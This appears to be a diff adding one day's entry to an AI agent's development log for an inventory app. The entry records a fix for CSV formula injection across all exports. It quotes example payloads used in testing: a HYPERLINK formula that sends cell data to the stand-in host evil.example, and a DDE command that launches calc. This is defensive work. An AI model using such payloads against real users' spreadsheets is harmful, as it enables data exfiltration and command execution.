@@ -3142,3 +3142,111 @@ file touched this session). All clean.
   as a parameter for no real duplication savings, and each order type's
   route file already owns its own status-transition logic (order/cancel/
   receive vs. cancel/fulfill) independently.
+
+## Day 34 (post-MVP) — 2026-09-07
+
+**Planned:** local `main` had drifted from `origin/main` again at session
+start (detached HEAD sitting exactly at Day 33's commit, with the local
+`main` ref stale three days behind at Day 30) — reset local `main` onto
+`origin/main` before touching anything, same recurring container-setup
+residue as several prior entries. From there, Day 33's own "Next" list had
+nothing newly actionable (both standing items are still blocked on
+infrastructure/a design partner this project doesn't have), so this session
+opened with its own gap sweep rather than continuing a queued item, and
+found a real, previously-unaddressed security gap: every CSV export in the
+product is vulnerable to formula/CSV injection (CWE-1236).
+
+**Shipped — CSV injection defense across every export:**
+
+Every CSV this product writes carries at least one free-text field a Staff
+member fully controls with no character restriction — a product's SKU or
+name, a category or location name, a stock movement's own `reason` on an
+ADJUSTMENT — and the reader on the other end is an Owner, opening the file
+in Excel or Sheets to look at stock or hand it to a supplier. Excel/Sheets
+treats a cell whose text starts with `=`, `+`, `-`, `@`, or a tab/CR as a
+formula to evaluate, independent of this API's own `text/csv` content
+type. A Staff member naming a product `=HYPERLINK("http://evil.example/
+"&A1,"click")`, or typing that into an adjustment's reason, means the
+formula runs the moment an Owner opens the exact export screen this app
+ships to let them review their own inventory — a lower-trust user reaching
+into a higher-trust one's spreadsheet. Nothing in this codebase's own CSV
+writers (`toCsv` in `lib/csv.ts`, and the Python service's pandas-based
+`_csv_response`) has ever escaped this; it was there from Day 10-11 (CSV
+export) and Day 31 (the stocktake export) onward, unflagged.
+
+- **Python service** (`app/routers/reports.py`, covers products/stock/
+  movements/dead-stock — every CSV export it serves): `_sanitize_csv_rows`
+  runs before `pd.DataFrame(rows)` in the shared `_csv_response` helper,
+  prefixing any dangerous-leading `str` value with a defusing `'`. Applied
+  by type, not by column name: every numeric/bool/date field in these rows
+  (quantities, prices, a movement's own signed `quantity`) is already a
+  native Python `int`/`float`/`bool`/`datetime` by the time it reaches this
+  function, never a stringified number, so the one legitimate case that
+  starts with `-` (a negative movement quantity) is structurally never in
+  scope for the check — no column allowlist to keep in sync as new export
+  columns are added.
+- **Node** (`lib/csv.ts`, feeding `stocktakes.routes.ts`'s `/:id/export`):
+  the same type-based trick isn't available here, since `toCsv` takes
+  `string[][]` — every cell, including a stringified `Expected`/`Counted`/
+  `Variance` number that legitimately starts with `-`, is already a string
+  by the time it arrives. Added `sanitizeCsvText`, called explicitly at the
+  three genuinely-free-text cells (SKU, product name, counter's display
+  name) rather than folded into `toCsv`/`formatCsvField` themselves, so the
+  numeric columns are never at risk of being mistaken for text.
+- Verified beyond the mocked test suite, against real Postgres + all three
+  running services + a real cross-origin browser: signed up, created a
+  product with SKU `=cmd|' /C calc'!A0` and name `=HYPERLINK("http://
+  evil.example/","steal")`, received stock, and posted an ADJUSTMENT with
+  reason `=HYPERLINK(...)` — then round-tripped every export through curl
+  (products/stock/movements/dead-stock CSVs from the Python service via the
+  Node proxy, and the Node-only stocktake export) and confirmed every one
+  came back with the SKU/name/reason prefixed by a defusing `'`, while
+  every genuinely negative number in the same rows (an ADJUSTMENT's `-1`
+  quantity, a stocktake line's `-7` variance) stayed a plain, untouched
+  number. Then drove the actual "Export Products" button through a real
+  cross-origin Chromium session (Playwright) and read the downloaded file
+  back off disk to confirm the same neutralization survives the full
+  browser download path, not just a direct API call.
+- 3 new python-service tests (products/movements/dead-stock, plus asserting
+  a real negative `quantity` is untouched) and 9 new backend tests (7 unit
+  cases for `sanitizeCsvText` covering each dangerous prefix, plus one
+  through the actual `/:id/export` route confirming the SKU/name are
+  defused while a real `-7` variance in the same row is not).
+
+**Verified (all three services):** backend `npx tsc --noEmit`, `npm run
+lint`, full Jest suite (423/423, up from 415 — 8 new `csv.test.ts`/
+`stocktakes.test.ts` cases); python-service `python3 -m pytest -q` (50/50,
+up from 47 — 3 new injection-neutralization cases); frontend `npm run
+lint`, `tsc -b`, `npm test` (440/440, unchanged — no frontend file touched
+this session), `npm run build`. All clean. Beyond that: real local Postgres
+(`pg_ctlcluster 16 main start`, created the `stockroom` role/db and the
+`stockroom_readonly` role from scratch — this sandbox had none of it yet,
+no new migration needed since this session added no schema change), ran the
+production readonly-role script (still clean since Day 31's fix) and all
+migrations, then the full curl/browser verification above against all
+three running services. Teardown after: dev servers killed, roles/database
+dropped, Postgres cluster stopped, `.env` files removed.
+
+**Next:**
+
+1. Still open, low urgency and unchanged across many entries: frontend
+   error reporting (no external sink) and Staff per-location scoping (no
+   design partner) — neither newly actionable this session either.
+2. Worth a look next time: whether the CSV *import* side (`products.routes.ts`,
+   `parseCsvRecords`) has any equivalent concern. It doesn't today — an
+   imported file is read as data into the database, never re-opened as a
+   spreadsheet by this app — but it's the kind of asymmetry worth a second
+   look if the import path ever grows a "download this back as a
+   confirmation sheet" feature.
+3. No other fresh gaps surfaced this session worth adding to the list.
+
+**Blockers/decisions carried forward:**
+
+- None new. Sanitizing by Python value type (python-service) versus by
+  call-site (Node's `toCsv`) is a deliberate asymmetry, not an
+  inconsistency: the Python rows still carry real numeric/date types when
+  they reach `_sanitize_csv_rows`, so a blanket by-type rule is exactly
+  correct there, while the Node stocktake export has already flattened
+  everything to strings before it reaches `toCsv`, where a blanket rule
+  would misfire on a legitimate negative variance. Each fix matches the
+  shape of the data it actually sees.
